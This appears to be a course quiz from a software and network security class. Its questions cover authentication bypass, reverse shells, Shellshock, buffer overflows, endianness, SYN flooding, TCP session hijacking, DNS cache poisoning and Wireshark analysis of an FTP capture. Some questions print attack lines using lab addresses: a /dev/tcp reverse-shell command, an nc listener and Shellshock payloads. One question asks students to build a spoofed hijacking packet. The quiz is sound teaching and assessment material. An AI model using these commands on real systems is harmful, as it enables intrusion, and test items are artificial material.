---
layout: default
course_number: CS335
title: "Quiz 1 - Software and Network Security"
---

### Quiz 1 - 100 points

#### Computer Security (40 pts)

- (6 pts) Two of the vulnerability classes we discussed were Authorization bypass and Authentication bypass. What is the major difference between the two?

- (7 pts) If you run `nc -lv 9090` on a machine with IP: 10.0.2.4 and run `/bin/cat < /dev/tcp/10.0.2.4/9090 >& 0` on another machine, what is going to happen?

- (7 pts) In the reverse shell examples in class, we started by redirecting the standard output. Help me complete a reverse shell this time by redirecting to the standard output first: ` /bin/bash -i < /dev/tcp/10.0.2.4/9090 ...`.

- (5 pts) In class we executed the following commands:  
```
  foo='() { echo "hello world!"; }; echo “you have been pwned";’
  export foo
  bash_shellshock
  you have been pwned
```   
And we saw _you have been pwned_ on the screen. Will the following _reversed_ command execute and be vulnerable to the shellshock attack?
```
foo='echo “you have been pwned"; () { echo "hello world!"; }; ’
```
Why or why not?

- (5 pts) What are the 2 conditions which allow the Shellshock vulnerability to be exploitable.

- (7 pts) Remember the _bof_ function from the Buffer Overflow Lab:  
```c
int bof(char *str)
{  
    char buffer[BUF_SIZE];    
    strcpy(buffer, str);  
    return 1;
}
```
Draw the stack layout for this function.

- (3 pts) Why does ASLR make buffer-overﬂow attack more difﬁcult?

#### Network Security (45 pts)

- (4 pts) An integer `0xWWXXYYZZ` is stored in memory starting at address `0x1000`. If the machine is a _Big-Endian_ machine, what is the value stored in addresses `0x1000`, `0x1001`, `0x1002`, and `0x1003`, respectively? If the machine is a _Little-Endian_ machine, how is this integer stored?  

- (5 pts) Consider the following program:  
```c
#include <arpa/inet.h>
#include <stdio.h>
void main() {
  int a = 1089712;
  printf("%x\n", htonl(a));
  printf("%x\n", ntohl(a));
}
```
What would be the result on _Big-Endian_? How about _Little-Indian_? Remember that network byte order is Big-Indian.

- (4 pts) In the SYN ﬂooding attack example in class we randomized the source IP address. Why cannot we just use the same IP address?

- (4 pts) Are TCP Reset Attacks effective against encrypted connections? Why or Why not?

- (10 pts) Presume there is an active Telnet connection from a  Client (10.0.2.5) to a Server (10.0.2.15). The server has just acknowledged a sequence number 34289, and the client has just acknowledged a sequence number 153980. An Attacker wants to launch the TCP session hijacking attack on the connection, so he can execute a remote shell on the server. The Attacker is on the same LAN as the Client and the Server. In order to launch the attack, the attacker needs to construct a TCP packet. Please help the Attacker to ﬁll in the following ﬁelds in the spoofed TCP packet:
  - Source IP:
  - Destination IP:
  - Source port:
  - Destination port:
  - Sequence number:
  - Acknowledgement number:
  - The TCP data ﬁeld:  


- (4 pts) In class we are used to referring of your own computer as _localhost_, now we would like to refer it as cs335host. What should you do to make that happen?

- (5 pts) What is DNS cache poisoning attack? What ﬁelds of the DNS query packet contain random data that need to be included in the response?

- (4 pts) DNS uses UDP by default, but the **dig** command has a flag to use TCP to send DNS queries. Verify that this is indeed the case, include your test results.

- (5 pts) My local DNS server received the following DNS reply.
```
;; QUESTION SECTION:
;www.yahoo.com.			IN	A  
;; ANSWER SECTION:
www.yahoo.com.		1617	IN	CNAME	atsv2-fp-shed.wg1.b.yahoo.com.
atsv2-fp-shed.wg1.b.yahoo.com. 60 IN	A	72.30.35.9
atsv2-fp-shed.wg1.b.yahoo.com. 60 IN	A	72.30.35.10
;; AUTHORITY SECTION:
.			1548	IN	NS	a.root-servers.net.
.			1548	IN	NS	e.root-servers.net.
.			1548	IN	NS	f.root-servers.net.
.			1548	IN	NS	c.root-servers.net.
.			1548	IN	NS	h.root-servers.net.
.			1548	IN	NS	g.root-servers.net.
.			1548	IN	NS	i.root-servers.net.
.			1548	IN	NS	d.root-servers.net.
.			1548	IN	NS	k.root-servers.net.
.			1548	IN	NS	l.root-servers.net.
.			1548	IN	NS	j.root-servers.net.
.			1548	IN	NS	b.root-servers.net.
.			1548	IN	NS	m.root-servers.net.
```
Which parts of the answer will not be cached by my local DNS server. Why not?

#### Wireshark (15 pts)    
I like to tell jokes. I also like to use FTP to transfer files from one machine to another. For the next 2 questions, please use [this](files\ftp.pcapng) Wireshark capture.

- (5 pts) What is the FTP program (including the software version) running on the server?

- (10 pts) What is the joke I'm trying to tell you?
  - Hint 1: The joke is in a zip file.
  - Hint 2: Wireshark's ability to `follow` protocol streams might be useful to you.
